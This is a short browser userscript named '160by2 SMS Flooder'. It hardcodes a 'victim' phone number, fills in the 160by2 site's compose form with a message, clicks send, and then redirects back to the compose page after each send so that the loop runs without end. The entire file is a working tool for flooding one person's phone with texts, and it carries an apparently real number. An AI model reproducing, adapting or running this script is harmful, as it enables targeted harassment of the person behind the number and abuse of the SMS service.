// ==UserScript==
// @name          160by2 SMS Flooder
// @namespace     Chakry \m/
// @description   flooder sms
// @include       http://*160by2.com/*
// ==/UserScript==

var victim=9561678788; //Enter victims number here
var delay=0; // Enter delay in milliseconds if required


if(document.location=="http://160by2.com/compose_sms.aspx")
{
document.getElementById('txt_mobileno').value=victim;
document.getElementById('txt_msg').value='I Love You\n\n\nArpit '+Math.floor(Math.random()*1000);
void(0);
document.getElementById('btnsendsms').click();
}

if(document.location=="http://160by2.com/postview_latest.aspx")
{
setTimeout('document.location="http://160by2.com/compose_sms.aspx"',delay);
}